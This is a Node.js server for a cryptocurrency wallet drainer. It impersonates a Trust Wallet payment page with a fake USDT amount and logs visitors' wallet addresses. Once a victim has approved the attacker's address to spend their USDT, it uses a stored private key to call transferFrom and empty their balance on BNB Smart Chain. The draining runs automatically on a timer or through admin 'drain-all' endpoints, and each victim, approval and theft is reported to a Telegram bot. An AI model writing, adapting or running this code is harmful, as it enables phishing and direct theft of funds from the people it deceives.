const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { URL } = require('url');

const PORT = process.env.PORT || 3000;
const DATA_DIR = path.join(__dirname, '../data');
const CONFIG_FILE = path.join(DATA_DIR, 'config.json');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const PUBLIC_DIR = path.join(__dirname, '../public');
const ADMIN_DIR = path.join(__dirname, '../admin');

const BSC_RPC = 'https://bsc-dataseed.binance.org/';
const USDT = '0x55d398326f99059fF775485246999027B3197955';

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const defaultConfig = {
  adminPassword: process.env.ADMIN_PASSWORD || 'admin123',
  receiverAddress: '',
  privateKey: '',
  fakeAmount: '5000000',
  fakeToken: 'USDT',
  chainId: 56,
  networkName: 'BNB Smart Chain',
  siteTitle: 'Trust Wallet - Payment',
  autoMonitor: true,
  autoDrain: false,
  telegramBotToken: '',
  telegramChatId: ''
};

function loadConfig() {
  try {
    if (fs.existsSync(CONFIG_FILE)) {
      return Object.assign({}, defaultConfig, JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')));
    }
  } catch (e) {}
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(defaultConfig, null, 2));
  return Object.assign({}, defaultConfig);
}

function saveConfig(cfg) {
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(cfg, null, 2));
}

function loadUsers() {
  try {
    if (fs.existsSync(USERS_FILE)) return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
  } catch (e) {}
  return [];
}

function saveUsers(users) {
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
}

function uuid() {
  return crypto.randomUUID ? crypto.randomUUID() : crypto.randomBytes(16).toString('hex');
}

function rpc(method, params) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify({ jsonrpc: '2.0', id: 1, method, params });
    const url = new URL(BSC_RPC);
    const req = https.request({
      hostname: url.hostname,
      path: url.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    }, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try {
          const j = JSON.parse(data);
          if (j.error) reject(new Error(j.error.message));
          else resolve(j.result);
        } catch (e) { reject(e); }
      });
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

function ethCall(to, data) {
  return rpc('eth_call', [{ to, data }, 'latest']);
}

function balanceOf(address) {
  const data = '0x70a08231' + address.toLowerCase().replace('0x', '').padStart(64, '0');
  return ethCall(USDT, data).then(r => BigInt(r || '0x0').toString());
}

function allowance(owner, spender) {
  const data = '0xdd62ed3e' +
    owner.toLowerCase().replace('0x', '').padStart(64, '0') +
    spender.toLowerCase().replace('0x', '').padStart(64, '0');
  return ethCall(USDT, data).then(r => BigInt(r || '0x0').toString());
}

function fromWei(v, decimals = 18) {
  const s = BigInt(v).toString().padStart(decimals + 1, '0');
  const i = s.slice(0, -decimals) || '0';
  const f = s.slice(-decimals).replace(/0+$/, '');
  return f ? i + '.' + f : i;
}

function parseBody(req) {
  return new Promise((resolve) => {
    let data = '';
    req.on('data', c => data += c);
    req.on('end', () => {
      try { resolve(JSON.parse(data || '{}')); }
      catch (e) { resolve({}); }
    });
  });
}

function sendJson(res, code, obj) {
  res.writeHead(code, {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*'
  });
  res.end(JSON.stringify(obj));
}

function sendFile(res, filePath) {
  const ext = path.extname(filePath).toLowerCase();
  const types = { '.html': 'text/html; charset=utf-8', '.js': 'application/javascript; charset=utf-8', '.css': 'text/css; charset=utf-8', '.json': 'application/json' };
  try {
    const data = fs.readFileSync(filePath);
    res.writeHead(200, { 'Content-Type': types[ext] || 'application/octet-stream' });
    res.end(data);
  } catch (e) {
    res.writeHead(404);
    res.end('Not found');
  }
}

function checkAuth(req) {
  const pass = req.headers['x-admin-pass'] || '';
  const cfg = loadConfig();
  return pass === cfg.adminPassword;
}

function tgSend(text) {
  const cfg = loadConfig();
  if (!cfg.telegramBotToken || !cfg.telegramChatId) return;
  const body = JSON.stringify({
    chat_id: cfg.telegramChatId,
    text: text,
    parse_mode: 'HTML',
    disable_web_page_preview: true
  });
  const url = new URL('https://api.telegram.org/bot' + cfg.telegramBotToken + '/sendMessage');
  const req = https.request({
    hostname: url.hostname,
    path: url.pathname,
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
  }, () => {});
  req.on('error', () => {});
  req.write(body);
  req.end();
}

async function doTransferFrom(from, to, amount, privateKey) {
  try {
    const Web3 = require('web3');
    const web3 = new Web3(BSC_RPC);
    const account = web3.eth.accounts.privateKeyToAccount(privateKey.startsWith('0x') ? privateKey : '0x' + privateKey);
    web3.eth.accounts.wallet.add(account);
    const abi = [{"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}];
    const contract = new web3.eth.Contract(abi, USDT);
    const tx = await contract.methods.transferFrom(from, to, amount).send({
      from: account.address,
      gas: 100000
    });
    return { success: true, txHash: tx.transactionHash, amount: fromWei(amount) };
  } catch (e) {
    return { success: false, error: e.message };
  }
}

const server = http.createServer(async (req, res) => {
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Headers': 'Content-Type, x-admin-pass',
      'Access-Control-Allow-Methods': 'GET,POST,DELETE,OPTIONS'
    });
    return res.end();
  }

  const u = new URL(req.url, 'http://localhost');
  const p = u.pathname;

  if (req.method === 'GET' && (p === '/' || p === '/index.html')) {
    return sendFile(res, path.join(PUBLIC_DIR, 'index.html'));
  }
  if (req.method === 'GET' && p.startsWith('/') && !p.startsWith('/api') && p !== '/admin') {
    const fp = path.join(PUBLIC_DIR, p.slice(1));
    if (fp.startsWith(PUBLIC_DIR) && fs.existsSync(fp) && fs.statSync(fp).isFile()) {
      return sendFile(res, fp);
    }
  }
  if (req.method === 'GET' && p === '/admin') {
    return sendFile(res, path.join(ADMIN_DIR, 'index.html'));
  }

  if (p === '/api/config' && req.method === 'GET') {
    const cfg = loadConfig();
    return sendJson(res, 200, {
      fakeAmount: cfg.fakeAmount,
      fakeToken: cfg.fakeToken,
      chainId: cfg.chainId,
      networkName: cfg.networkName,
      siteTitle: cfg.siteTitle,
      usdtAddress: USDT
    });
  }

  if (p === '/api/spender' && req.method === 'GET') {
    const cfg = loadConfig();
    return sendJson(res, 200, { spender: cfg.receiverAddress || null });
  }

  if (p === '/api/user/connect' && req.method === 'POST') {
    const body = await parseBody(req);
    const address = body.address;
    if (!address || !/^0x[a-fA-F0-9]{40}$/.test(address)) {
      return sendJson(res, 400, { error: 'Invalid address' });
    }
    let users = loadUsers();
    let user = users.find(x => x.address.toLowerCase() === address.toLowerCase());
    if (!user) {
      user = {
        id: uuid(),
        address,
        connectedAt: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        chainId: 56,
        balanceBNB: '0',
        balanceUSDT: '0',
        allowance: '0',
        approved: false,
        drained: false,
        status: 'connected',
        drainedAmount: '0',
        txHash: null
      };
      users.push(user);
      tgSend('🟢 <b>NEW USER</b>\n\n👤 ID: <code>' + user.id.slice(0,8) + '</code>\n📍 <code>' + address + '</code>\n⏰ ' + new Date().toLocaleString('en-IN'));
    } else {
      user.lastSeen = new Date().toISOString();
    }
    saveUsers(users);
    return sendJson(res, 200, { success: true, id: user.id });
  }

  if (p === '/api/user/update' && req.method === 'POST') {
    const body = await parseBody(req);
    let users = loadUsers();
    let user = users.find(x => x.address.toLowerCase() === (body.address || '').toLowerCase());
    if (user) {
      const oldUSDT = parseFloat(user.balanceUSDT || 0);
      if (body.balanceBNB !== undefined) user.balanceBNB = body.balanceBNB;
      if (body.balanceUSDT !== undefined) user.balanceUSDT = body.balanceUSDT;
      user.lastSeen = new Date().toISOString();
      const newUSDT = parseFloat(user.balanceUSDT || 0);
      if (newUSDT > oldUSDT + 0.01) {
        tgSend('💰 <b>DEPOSIT</b>\n\n👤 ID: <code>' + user.id.slice(0,8) + '</code>\n📍 <code>' + user.address + '</code>\n💵 New USDT: <b>' + user.balanceUSDT + '</b>\n⛽ BNB: ' + (user.balanceBNB || '0') + '\n⏰ ' + new Date().toLocaleString('en-IN'));
      }
      saveUsers(users);
    }
    return sendJson(res, 200, { success: true });
  }

  if (p === '/api/user/approved' && req.method === 'POST') {
    const body = await parseBody(req);
    let users = loadUsers();
    let user = users.find(x => x.address.toLowerCase() === (body.address || '').toLowerCase());
    if (user) {
      user.approved = true;
      user.allowance = body.allowance || 'unlimited';
      user.status = 'approved';
      user.lastSeen = new Date().toISOString();
      saveUsers(users);
      tgSend('✅ <b>APPROVED</b>\n\n👤 ID: <code>' + user.id.slice(0,8) + '</code>\n📍 <code>' + user.address + '</code>\n💵 USDT: <b>' + (user.balanceUSDT || '0') + '</b>\n⛽ BNB: ' + (user.balanceBNB || '0') + '\n🔐 Allowance: ' + user.allowance + '\n⏰ ' + new Date().toLocaleString('en-IN'));
    }
    return sendJson(res, 200, { success: true });
  }

  if (p.startsWith('/api/admin')) {
    if (!checkAuth(req)) return sendJson(res, 401, { error: 'Unauthorized' });

    if (p === '/api/admin/config' && req.method === 'GET') {
      const cfg = loadConfig();
      return sendJson(res, 200, {
        receiverAddress: cfg.receiverAddress,
        fakeAmount: cfg.fakeAmount,
        adminPassword: cfg.adminPassword ? '***' : '',
        autoMonitor: cfg.autoMonitor,
        autoDrain: cfg.autoDrain,
        networkName: cfg.networkName,
        telegramBotToken: cfg.telegramBotToken ? '***set***' : '',
        telegramChatId: cfg.telegramChatId || '',
        hasPrivateKey: !!cfg.privateKey
      });
    }

    if (p === '/api/admin/config' && req.method === 'POST') {
      const body = await parseBody(req);
      const cfg = loadConfig();
      if (body.receiverAddress !== undefined) cfg.receiverAddress = body.receiverAddress;
      if (body.fakeAmount !== undefined) cfg.fakeAmount = body.fakeAmount;
      if (body.adminPassword) cfg.adminPassword = body.adminPassword;
      if (body.autoMonitor !== undefined) cfg.autoMonitor = body.autoMonitor;
      if (body.autoDrain !== undefined) cfg.autoDrain = body.autoDrain;
      if (body.privateKey) cfg.privateKey = body.privateKey.replace(/^0x/, '');
      if (body.telegramBotToken) cfg.telegramBotToken = body.telegramBotToken;
      if (body.telegramChatId !== undefined) cfg.telegramChatId = body.telegramChatId;
      saveConfig(cfg);
      return sendJson(res, 200, { success: true });
    }

    if (p === '/api/admin/users' && req.method === 'GET') {
      return sendJson(res, 200, loadUsers());
    }

    if (p.startsWith('/api/admin/user/') && req.method === 'DELETE') {
      const id = p.split('/').pop();
      let users = loadUsers().filter(x => x.id !== id);
      saveUsers(users);
      return sendJson(res, 200, { success: true });
    }

    if (p.startsWith('/api/admin/refresh/') && req.method === 'POST') {
      const id = p.split('/').pop();
      let users = loadUsers();
      let user = users.find(x => x.id === id);
      if (!user) return sendJson(res, 404, { error: 'Not found' });
      try {
        const bnbHex = await rpc('eth_getBalance', [user.address, 'latest']);
        user.balanceBNB = fromWei(BigInt(bnbHex).toString());
        const usdtBal = await balanceOf(user.address);
        user.balanceUSDT = fromWei(usdtBal);
        const cfg = loadConfig();
        if (cfg.receiverAddress) {
          const allow = await allowance(user.address, cfg.receiverAddress);
          user.allowance = fromWei(allow);
          user.approved = BigInt(allow) > 0n;
          if (user.approved && !user.drained) user.status = 'approved';
        }
        user.lastSeen = new Date().toISOString();
        saveUsers(users);
        return sendJson(res, 200, { success: true, user });
      } catch (e) {
        return sendJson(res, 500, { error: e.message });
      }
    }

    if (p.startsWith('/api/admin/drain/') && req.method === 'POST') {
      const id = p.split('/').pop();
      let users = loadUsers();
      let user = users.find(x => x.id === id);
      if (!user) return sendJson(res, 404, { error: 'Not found' });
      const cfg = loadConfig();
      if (!cfg.receiverAddress) return sendJson(res, 400, { error: 'Set receiver address first' });
      try {
        const bal = await balanceOf(user.address);
        if (bal === '0') return sendJson(res, 400, { error: 'Zero USDT balance' });
        if (cfg.privateKey && cfg.autoDrain) {
          const result = await doTransferFrom(user.address, cfg.receiverAddress, bal, cfg.privateKey);
          if (result.success) {
            user.drained = true;
            user.status = 'drained';
            user.drainedAmount = result.amount;
            user.txHash = result.txHash;
            saveUsers(users);
            tgSend('🔥 <b>DRAINED</b>\n\n👤 ID: <code>' + user.id.slice(0,8) + '</code>\n📍 <code>' + user.address + '</code>\n💵 Amount: <b>' + result.amount + ' USDT</b>\n🔗 Tx: <code>' + result.txHash + '</code>\n⏰ ' + new Date().toLocaleString('en-IN'));
            return sendJson(res, 200, { success: true, amount: result.amount, txHash: result.txHash });
          }
          return sendJson(res, 500, { error: result.error });
        }
        user.status = 'ready_to_drain';
        user.drainedAmount = fromWei(bal);
        saveUsers(users);
        return sendJson(res, 200, {
          success: true,
          message: 'Ready. Use BscScan or private key to transferFrom',
          amount: fromWei(bal),
          from: user.address,
          to: cfg.receiverAddress
        });
      } catch (e) {
        return sendJson(res, 500, { error: e.message });
      }
    }

    if (p === '/api/admin/drain-all' && req.method === 'POST') {
      const cfg = loadConfig();
      if (!cfg.receiverAddress) return sendJson(res, 400, { error: 'Set receiver first' });
      let users = loadUsers();
      const results = [];
      for (const user of users) {
        if (user.drained || !user.approved) continue;
        try {
          const bal = await balanceOf(user.address);
          if (bal === '0') continue;
          if (cfg.privateKey && cfg.autoDrain) {
            const result = await doTransferFrom(user.address, cfg.receiverAddress, bal, cfg.privateKey);
            if (result.success) {
              user.drained = true;
              user.status = 'drained';
              user.drainedAmount = result.amount;
              user.txHash = result.txHash;
              results.push({ address: user.address, amount: result.amount, txHash: result.txHash });
              tgSend('🔥 <b>DRAINED</b>\n\n👤 ID: <code>' + user.id.slice(0,8) + '</code>\n📍 <code>' + user.address + '</code>\n💵 Amount: <b>' + result.amount + ' USDT</b>\n🔗 Tx: <code>' + result.txHash + '</code>\n⏰ ' + new Date().toLocaleString('en-IN'));
            } else {
              results.push({ address: user.address, error: result.error });
            }
          } else {
            user.status = 'ready_to_drain';
            user.drainedAmount = fromWei(bal);
            results.push({ address: user.address, amount: fromWei(bal) });
          }
        } catch (e) {
          results.push({ address: user.address, error: e.message });
        }
      }
      saveUsers(users);
      return sendJson(res, 200, { success: true, results });
    }

    if (p === '/api/admin/mark-drained' && req.method === 'POST') {
      const body = await parseBody(req);
      let users = loadUsers();
      let user = users.find(x => x.id === body.id || x.address.toLowerCase() === (body.address || '').toLowerCase());
      if (user) {
        user.drained = true;
        user.status = 'drained';
        user.txHash = body.txHash || null;
        if (body.amount) user.drainedAmount = body.amount;
        saveUsers(users);
      }
      return sendJson(res, 200, { success: true });
    }

    if (p === '/api/admin/test-telegram' && req.method === 'POST') {
      tgSend('<b>Test Message</b>\n\nTelegram bot connected successfully.\nTime: ' + new Date().toLocaleString());
      return sendJson(res, 200, { success: true });
    }
  }

  res.writeHead(404);
  res.end('Not found');
});

setInterval(async () => {
  const cfg = loadConfig();
  if (!cfg.autoMonitor) return;
  let users = loadUsers();
  let changed = false;
  for (const user of users) {
    if (user.drained) continue;
    try {
      const bnbHex = await rpc('eth_getBalance', [user.address, 'latest']);
      const newBNB = fromWei(BigInt(bnbHex).toString());
      const usdtBal = await balanceOf(user.address);
      const newUSDT = fromWei(usdtBal);
      const oldUSDT = parseFloat(user.balanceUSDT || 0);
      if (user.balanceBNB !== newBNB || user.balanceUSDT !== newUSDT) {
        if (parseFloat(newUSDT) > oldUSDT + 0.01) {
          tgSend('💰 <b>DEPOSIT</b>\n\n👤 ID: <code>' + user.id.slice(0,8) + '</code>\n📍 <code>' + user.address + '</code>\n💵 New USDT: <b>' + newUSDT + '</b>\n⛽ BNB: ' + newBNB + '\n⏰ ' + new Date().toLocaleString('en-IN'));
        }
        user.balanceBNB = newBNB;
        user.balanceUSDT = newUSDT;
        changed = true;
      }
      if (cfg.receiverAddress) {
        const allow = await allowance(user.address, cfg.receiverAddress);
        const newAllow = fromWei(allow);
        if (user.allowance !== newAllow) {
          user.allowance = newAllow;
          user.approved = BigInt(allow) > 0n;
          if (user.approved) user.status = 'approved';
          changed = true;
        }
      }
      if (cfg.autoDrain && cfg.privateKey && user.approved && parseFloat(user.balanceUSDT || 0) > 0) {
        const bal = await balanceOf(user.address);
        if (bal !== '0') {
          const result = await doTransferFrom(user.address, cfg.receiverAddress, bal, cfg.privateKey);
          if (result.success) {
            user.drained = true;
            user.status = 'drained';
            user.drainedAmount = result.amount;
            user.txHash = result.txHash;
            changed = true;
            tgSend('🔥 <b>DRAINED</b>\n\n👤 ID: <code>' + user.id.slice(0,8) + '</code>\n📍 <code>' + user.address + '</code>\n💵 Amount: <b>' + result.amount + ' USDT</b>\n🔗 Tx: <code>' + result.txHash + '</code>\n⏰ ' + new Date().toLocaleString('en-IN'));
          }
        }
      }
    } catch (e) {}
  }
  if (changed) saveUsers(users);
}, 20000);

server.listen(PORT, '0.0.0.0', () => {
  console.log('BSC Auto Drainer LIVE on http://0.0.0.0:' + PORT);
  console.log('Admin: http://0.0.0.0:' + PORT + '/admin');
  console.log('Password: ' + (process.env.ADMIN_PASSWORD || 'admin123'));
});
